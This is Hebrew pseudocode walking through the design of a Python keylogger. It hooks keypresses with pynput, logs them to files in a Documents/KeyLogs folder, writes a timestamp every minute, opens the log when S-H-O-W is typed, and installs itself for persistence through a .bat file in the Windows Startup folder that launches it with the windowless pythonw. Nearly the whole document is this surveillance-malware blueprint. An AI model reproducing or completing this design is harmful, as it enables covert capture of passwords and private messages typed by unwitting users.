
1. **ייבוא ספריות:**

```pseudo
ייבא את os             # עבודה עם קבצים ותיקיות
ייבא את threading      # מאפשר הרצת פעולות במקביל (thread)
ייבא מ-pynput.keyboard את Listener, Key, KeyCode  # הקשבה ללחיצות מקשים
ייבא את datetime מהמודול datetime  # לקבלת תאריך ושעה
ייבא את time           # לעצירת פעולות לזמן מסוים
ייבא את shutil         # פעולות קבצים - העתקה, מחיקה, העברה
```

2. **יצירת נתיבים ושמות לקבצים:**

```pseudo
צור תיקייה בשם KeyLogs בתיקיית Documents של המשתמש

קבע משתנה now = תאריך ושעה נוכחיים (בפורמט: יום-חודש-שנה-שעה.דקה.שנייה)

קבע:
  filename = קובץ הקלט עם שם לפי התאריך
  Last_listen_filename = קובץ ששומר את הלוג האחרון
  Current_listening_name = קובץ ששומר את הלוג הנוכחי בזמן אמת
  Current_listening = רשימה ריקה של המקשים האחרונים
```

3. **פונקציה: Show\_listening**

```pseudo
אם קובץ Last_listen.txt קיים:
    פתח אותו
אחרת:
    פתח את listening.txt
```

4. **פונקציה: timestemp\_everyminute**

```pseudo
בלולאה אינסופית:
    קבל את התאריך והשעה הנוכחיים
    כתוב אותם לקובץ הלוג הראשי (filename)
    המתן 60 שניות
```

5. **פונקציה: on\_press(key)**

```pseudo
נסה להמיר את המקש לטקסט רגיל
אם לא מצליח → הפוך אותו ל-[KeyName]

כתוב את הטקסט לקובץ filename וגם ל-listening.txt

נסה לקבל את vk (קוד מספרי של המקש)
אם הצליח:
    הוסף את הקוד לרשימה Current_listening
    השאר רק את 4 האחרונים
    אם הרשימה היא בדיוק [83, 72, 79, 87]  #(S,H,O,W)
        הפעל את Show_listening()

אם נלחץ המקש ESC:
    סיים את ההאזנה
```

6. **פונקציה: start\_Thread\_timestemp**

```pseudo
הפעל את timestemp_everyminute בתור thread (שירוץ ברקע)
```

7. **פונקציה: start\_listening**

```pseudo
התחל להאזין למקלדת (כל מקש שנלחץ יפעיל את on_press)
```

8. **פונקציה: file\_organization**

```pseudo
אם קובץ Last_listen.txt קיים → מחק אותו
אם קובץ listening.txt קיים → שנה את שמו ל-Last_listen.txt
```

9. **פונקציה: add\_to\_startup**

```pseudo
צור קובץ run_keylogger.bat בתיקייה KeyLogs
הכנס לתוכו שורת הפעלה: start "" "pythonw" "script.py"

מצא את תיקיית ההפעלה האוטומטית של Windows (Startup)
אם לא קיים שם קובץ bat הזה → העתק אותו לשם
```

10. **פונקציה: main**

```pseudo
הפעל את:
  add_to_startup()
  file_organization()
  start_Thread_timestemp()
  start_listening()
```

11. **הפעלת הקוד בפועל:**

```pseudo
אם זה הקובץ הראשי שמורץ:
    קרא לפונקציה main()
```


